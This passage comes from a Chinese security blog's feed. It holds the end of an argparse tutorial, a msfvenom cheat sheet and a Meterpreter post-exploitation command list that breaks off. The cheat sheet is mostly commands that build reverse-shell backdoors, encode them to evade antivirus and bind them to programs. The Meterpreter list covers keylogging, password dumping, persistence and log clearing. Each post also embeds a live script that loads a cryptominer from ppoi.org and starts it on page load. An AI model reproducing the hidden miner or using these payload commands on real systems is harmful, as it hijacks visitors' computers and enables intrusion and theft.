add_help=True)</div></pre></td></tr></table></figure><p>创建一个新的<code>ArgumentParser</code>对象。所有的参数应该以关键字参数传递。下面有对每个参数各自详细的描述，但是简短地讲它们是</p><ul><li>prog - 程序的名字（默认：sys.argv[0]）</li><li>usage - 描述程序用法的字符串（默认：从解析器的参数生成）</li><li>description - 参数帮助信息之前的文本（默认：空）</li><li>epilog - 参数帮助信息之后的文本（默认：空）</li><li>parents - ArgumentParser 对象的一个列表，这些对象的参数应该包括进去</li><li>formatter_class - 定制化帮助信息的类</li><li>prefix_chars - 可选参数的前缀字符集（默认：‘-‘）</li><li>fromfile_prefix_chars - 额外的参数应该读取的文件的前缀字符集（默认：None）</li><li>argument_default - 参数的全局默认值（默认：None）</li><li>conflict_handler - 解决冲突的可选参数的策略（通常没有必要）</li><li>add_help - 给解析器添加-h/–help 选项（默认：True）</li></ul><h4 id="参数详细解释点我"><a href="#参数详细解释点我" class="headerlink" title="参数详细解释点我"></a><a href="https://docs.python.org/2/library/argparse.html#argumentparser-objects" target="_blank" rel="external">参数详细解释点我</a></h4><h2 id="0×03-add-argument-方法"><a href="#0×03-add-argument-方法" class="headerlink" title="0×03 add_argument()方法"></a>0×03 add_argument()方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ArgumentParser.add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest])</div></pre></td></tr></table></figure><p>定义应该如何解析一个命令行参数。下面每个参数有它们自己详细的描述，简单地讲它们是：</p><ul><li>name or flags - 选项字符串的名字或者列表，例如foo 或者-f, –foo。</li><li>action - 在命令行遇到该参数时采取的基本动作类型。</li><li>nargs - 应该读取的命令行参数数目。</li><li>const - 某些action和nargs选项要求的常数值。</li><li>default - 如果命令行中没有出现该参数时的默认值。</li><li>type - 命令行参数应该被转换成的类型。</li><li>choices - 参数可允许的值的一个容器。</li><li>required - 该命令行选项是否可以省略（只针对可选参数）。</li><li>help - 参数的简短描述。</li><li>metavar - 参数在帮助信息中的名字。</li><li>dest - 给parse_args()返回的对象要添加的属性名称。</li></ul><h4 id="参数详细解释点我-1"><a href="#参数详细解释点我-1" class="headerlink" title="参数详细解释点我"></a><a href="https://docs.python.org/2/library/argparse.html#the-add-argument-method" target="_blank" rel="external">参数详细解释点我</a></h4><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><h4 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a><a href="https://docs.python.org/2/library/argparse.html" target="_blank" rel="external">官方文档</a></h4><h4 id="官方文档翻译"><a href="#官方文档翻译" class="headerlink" title="官方文档翻译"></a><a href="http://python.usyiyi.cn/documents/python_278/library/argparse.html" target="_blank" rel="external">官方文档翻译</a></h4>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer6&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer6&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;http://damit5.kiwi/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://damit5.ml/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>MSFvenom使用总结</title>
    <link href="http://damit5.ml/2017/09/30/MSFvenom%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://damit5.ml/2017/09/30/MSFvenom使用总结/</id>
    <published>2017-09-30T05:54:43.000Z</published>
    <updated>2017-11-14T05:55:07.328Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer2" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer2"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><a id="more"></a><h2 id="0×00-参数介绍"><a href="#0×00-参数介绍" class="headerlink" title="0×00 参数介绍"></a>0×00 参数介绍</h2><p>Msfvenom是有效载荷生成和编码的组合，它于2015年6月8日取代了msfpayload和msfencode</p><p>再开始使用msfvenom前，请先看看它支持的选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -h</div></pre></td></tr></table></figure><p><img src="http://damit5.ml/usr/uploads/BLOG/msfvenom/msfvenom.png" alt="msfvenom"></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-p, --payload           #添加载荷payload</div><div class="line">    --payload-options   #列出payload选项</div></pre></td></tr></table></figure><p>载荷这个东西比较多，这个软件就是根据对应的载荷payload生成对应平台下的后门，所以只有选对payload，再填写正确自己的IP，PORT就可以生成对应语言，对应平台的后门了</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-l, --list              #查看所有payload、encoder、nops</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-f, --format            #输出文件的格式</div><div class="line">    --help-formats      #列出所有文件格式</div></pre></td></tr></table></figure><h4 id="可执行的格式-Executable-formats"><a href="#可执行的格式-Executable-formats" class="headerlink" title="可执行的格式 ( Executable formats )"></a>可执行的格式 ( Executable formats )</h4><p>asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war</p><h4 id="需要变换的格式-Transform-formats"><a href="#需要变换的格式-Transform-formats" class="headerlink" title="需要变换的格式: ( Transform formats )"></a>需要变换的格式: ( Transform formats )</h4><p>bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-e, --encoder           #编码免杀</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-a, --arch             #选择架构</div><div class="line">    --platform         #选择平台</div><div class="line">    --help-platforms   #列出可选择的平台</div></pre></td></tr></table></figure><h4 id="选择架构平台"><a href="#选择架构平台" class="headerlink" title="选择架构平台"></a>选择架构平台</h4><p>x86 | x64 | x86_64</p><h4 id="Platforms"><a href="#Platforms" class="headerlink" title="Platforms:"></a>Platforms:</h4><p>windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-s, --space             #生成payload的最大长度，就是文件大小</div><div class="line">    --encoder-space     #生成编码payload的最大长度</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-b, --bad-chars         #避免使用的字符 例如：不使用 &apos;\x00&apos;</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-i, --iterations        #编码次数</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c, --add-code           #添加自己的shellcode</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-o, --out               #文件输出</div></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-x | -k                 #将后门捆绑到程序上</div></pre></td></tr></table></figure><h2 id="0×01-Msfvenom实例"><a href="#0×01-Msfvenom实例" class="headerlink" title="0×01 Msfvenom实例"></a>0×01 Msfvenom实例</h2><h4 id="普通生成"><a href="#普通生成" class="headerlink" title="普通生成"></a>普通生成</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</div><div class="line"></div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp -f exe -o /root/shell.exe</div></pre></td></tr></table></figure><h4 id="编码处理型"><a href="#编码处理型" class="headerlink" title="编码处理型"></a>编码处理型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt;  -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;</div><div class="line"></div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o /root/shell.exe</div></pre></td></tr></table></figure><h4 id="捆绑"><a href="#捆绑" class="headerlink" title="捆绑"></a>捆绑</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -x /root/test.exe -k -f exe -o /root/shell.exe</div></pre></td></tr></table></figure><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o /root/shell.exe</div><div class="line"></div><div class="line">Msfvenom -platform windows -a x86 -p windows/x64/meterpreter/reverse_tcp -f exe -o /root/shell.exe</div></pre></td></tr></table></figure><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div></pre></td></tr></table></figure><h4 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div></pre></td></tr></table></figure><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div></pre></td></tr></table></figure><h4 id="Asp"><a href="#Asp" class="headerlink" title="Asp"></a>Asp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div></pre></td></tr></table></figure><h4 id="Aspx"><a href="#Aspx" class="headerlink" title="Aspx"></a>Aspx</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f aspx &gt; shell.aspx</div></pre></td></tr></table></figure><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure><h4 id="War"><a href="#War" class="headerlink" title="War"></a>War</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div></pre></td></tr></table></figure><h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure><h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p python/meterpreter/reverser_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><h3 id="How-to-use-msfvenom"><a href="#How-to-use-msfvenom" class="headerlink" title="How-to-use-msfvenom"></a><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank" rel="external">How-to-use-msfvenom</a></h3><h3 id="MSFvenom"><a href="#MSFvenom" class="headerlink" title="MSFvenom"></a><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="external">MSFvenom</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer2&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer2&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;http://damit5.kiwi/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;
    
    </summary>
    
    
      <category term="Metasploit-Framework" scheme="http://damit5.ml/tags/Metasploit-Framework/"/>
    
  </entry>
  
  <entry>
    <title>Meterpreter 常用命令和后渗透</title>
    <link href="http://damit5.ml/2017/09/30/Meterpreter-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    <id>http://damit5.ml/2017/09/30/Meterpreter-常用命令和后渗透/</id>
    <published>2017-09-30T05:51:58.000Z</published>
    <updated>2017-11-14T05:54:43.628Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer1" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer1"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><p>整理在一起，用的时候也比较方便</p><a id="more"></a><h2 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">?   #帮助菜单</div><div class="line">background   #将当前会话移动到背景</div><div class="line">bgkill   #杀死一个背景 meterpreter 脚本</div><div class="line">bglist   #提供所有正在运行的后台脚本的列表</div><div class="line">bgrun   #作为一个后台线程运行脚本</div><div class="line">channel   #显示活动频道</div><div class="line">close   #关闭通道</div><div class="line">exit   #终止 meterpreter 会话</div><div class="line">help   #帮助菜单</div><div class="line">interact   #与通道进行交互</div><div class="line">irb   #进入 Ruby 脚本模式</div><div class="line">migrate   #移动到一个指定的 PID 的活动进程 eg:migrate 110</div><div class="line">quit   #终止 meterpreter 会话</div><div class="line">read   #从通道读取数据</div><div class="line">run   #执行以后它选定的 meterpreter 脚本</div><div class="line">use   #加载 meterpreter 的扩展</div><div class="line">write   #将数据写入到一个通道</div></pre></td></tr></table></figure><h2 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">cat   #读取并输出到标准输出文件的内容</div><div class="line">cd   #更改目录对受害人</div><div class="line">del   #删除文件对受害人</div><div class="line">download  #从受害者系统文件下载</div><div class="line">edit  #用 vim编辑文件</div><div class="line">getlwd   #打印本地目录</div><div class="line">getwd   #打印工作目录</div><div class="line">lcd   #更改本地目录</div><div class="line">lpwd   #打印本地目录</div><div class="line">ls   #列出在当前目录中的文件列表</div><div class="line">mkdir   #在受害者系统上的创建目录</div><div class="line">pwd   #输出工作目录</div><div class="line">rm   #删除文件</div><div class="line">rmdir   #受害者系统上删除目录</div><div class="line">upload  #从攻击者的系统往受害者系统上传文件</div></pre></td></tr></table></figure><h2 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ipconfig  #显示网络接口的关键信息，包括 IP 地址、 等。</div><div class="line">portfwd  #端口转发</div><div class="line">route  #查看或修改受害者路由表</div></pre></td></tr></table></figure><h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">clearav   #清除了受害者的计算机上的事件日志</div><div class="line">drop_token   #被盗的令牌</div><div class="line">execute  #执行命令</div><div class="line">getpid   #获取当前进程 ID (PID)</div><div class="line">getprivs   #尽可能获取尽可能多的特权</div><div class="line">getuid   #获取作为运行服务器的用户</div><div class="line">kill   #终止指定 PID 的进程</div><div class="line">ps   #列出正在运行的进程</div><div class="line">reboot  #重新启动受害人的计算机</div><div class="line">reg   #与受害人的注册表进行交互</div><div class="line">rev2self   #在受害者机器上调用 RevertToSelf()</div><div class="line">shell   #在受害者计算机上打开一个shell</div><div class="line">shutdown  #关闭了受害者的计算机</div><div class="line">steal_token   #试图窃取指定的 (PID) 进程的令牌</div><div class="line">sysinfo   #获取有关受害者计算机操作系统和名称等的详细信息</div></pre></td></tr></table></figure><h2 id="用户界面命令"><a href="#用户界面命令" class="headerlink" title="用户界面命令"></a>用户界面命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">enumdesktops   #列出所有可访问台式机</div><div class="line">getdesktop   #获取当前的 meterpreter 桌面</div><div class="line">idletime   #检查长时间以来，受害者系统空闲进程</div><div class="line">keyscan_dump   #键盘记录软件的内容转储</div><div class="line">keyscan_start   #启动时与如 Word 或浏览器的进程相关联的键盘记录软件</div><div class="line">keyscan_stop   #停止键盘记录软件</div><div class="line">screenshot  #抓取 meterpreter 桌面的屏幕截图</div><div class="line">set_desktop   #更改 meterpreter 桌面</div><div class="line">uictl   #启用用户界面组件的一些控件</div></pre></td></tr></table></figure><h2 id="特权升级命令"><a href="#特权升级命令" class="headerlink" title="特权升级命令"></a>特权升级命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getsystem   #获得系统管理员权限</div></pre></td></tr></table></figure><h2 id="密码转储命令"><a href="#密码转储命令" class="headerlink" title="密码转储命令"></a>密码转储命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">hashdump   #抓取哈希密码 (SAM) 文件中的值</div><div class="line"># 请注意 hashdump 会可以跳过杀毒软件，但现在有两个脚本，都更加隐蔽，”run hashdump”和”run smart_hashdump”。</div><div class="line"></div><div class="line">load mimikatz   #加载</div><div class="line">wdigest         #读取用户明文密码</div></pre></td></tr></table></figure><h2 id="维持权限命令"><a href="#维持权限命令" class="headerlink" title="维持权限命令"></a>维持权限命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">run  persistence -X  -i  5  -p &lt;your_port&gt;  -r &lt;your_ip&gt; </div><div class="line"></div><div class="line">-X 在目标主机上开机自启动</div><div class="line">-i  不断尝试反向连接的时间间隔</div></pre></td></tr></table></figure><h2 id="Timestomp-命令"><a href="#Timestomp-命令" class="headerlink" title="Timestomp 命令"></a>Timestomp 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">timestomp   #修改文件时间戳</div></pre></td></tr></table></figure><h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">webcam_list   #列举摄像头</div><div class="line">webcam_snap   #拍照</div><div class="line">wencam_stream   #监控视频</div></pre></td></tr></table></figure><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><blockquote><p>在获得meterpreter的session后，除了meterpreter本身内置的一些基本功能，在<code>/usr/share/metasploit-framework/scripts/meterpreter</code>下面还有很多scripts，提供了很多额外功能，非常好用</p><p>我们可以通过 <code>run 脚本名</code> 来进行使用</p><p><code>run 脚本名 -h</code> 可以查看帮助</p><p>以下翻译来自Google</p><h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-list-hacking-scripts-for-metasploits-meterpreter-0149339/" target="_blank" rel="external">原文</a></h2><h2 id="部分翻译参考"><a href="#部分翻译参考" class="headerlink" title="部分翻译参考"></a><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=9119&amp;highlight=meterpreter" target="_blank" rel="external">部分翻译参考</a></h2></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">arp_scanner.rb  #利用arp进行存货主机扫描。</div><div class="line">autoroute.rb  #Meterpreter会话，无需背景当前会话。</div><div class="line">checkvm.rb  #用于检测目标主机是否为虚拟机的脚本。</div><div class="line">credcollect.rb  #收集主机上找到的凭据的脚本，并将其存储在数据库中。</div><div class="line">domain_list_gen.rb  #用于提取域管理员帐户列表以供使用的脚本。</div><div class="line">dumplinks.rb  #从用户最近的文档文件夹和Microsoft Office的Recent Documents文件夹（如果存在）中，Dumplinks解析.lnk文件。.lnk文件包含时间戳，文件位置，包括共享名称，卷序列号等。此信息可能有助于您瞄准其他系统。</div><div class="line">duplicate.rb  #再次产生payload，注入到其他进程或打开新程序并注入其中</div><div class="line">enum_chrome.rb  #从chrome安装中提取数据的脚本。</div><div class="line">enum_firefox.rb  #从Firefox中提取数据的脚本。</div><div class="line">enum_logged_on_users.rb  #用于枚举登录到系统的当前记录的用户和用户的脚本。</div><div class="line">enum_powershell_env.rb  #枚举PowerShell和WSH配置。</div><div class="line">enum_putty.rb  #枚举Putty连接。</div><div class="line">enum_shares.rb  #用于枚举所提供股票的脚本和挂载股票的历史。</div><div class="line">enum_vmware.rb  #枚举VMware产品的VMware配置。</div><div class="line">event_manager.rb  #显示目标系统上的事件日志信息及其配置。</div><div class="line">file_collector.rb  #用于搜索和下载与特定模式匹配的文件的脚本。</div><div class="line">get_application_list.rb  #用于提取已安装应用程序及其版本的列表的脚本。</div><div class="line">getcountermeasure.rb  #用于检测AV，HIPS，第三方防火墙，DEP配置和Windows防火墙配置的脚本。还提供杀死检测到的产品的过程并禁用内置防火墙的选项。</div><div class="line">get_env.rb  #用于提取所有系统和用户环境变量列表的脚本。</div><div class="line">getfilezillacreds.rb  #从Filezilla中提取服务器和凭据的脚本。</div><div class="line">getgui.rb  #启用Windows RDP的脚本。</div><div class="line">get_local_subnets.rb  #根据主机的路由获取本地子网列表。</div><div class="line">get_pidgen_creds.rb  #使用用户名和密码提取配置的服务的脚本。</div><div class="line">gettelnet.rb  #检查是否安装了telnet。</div><div class="line">get_valid_community.rb  #从SNMP获取一个有效的社区字符串。</div><div 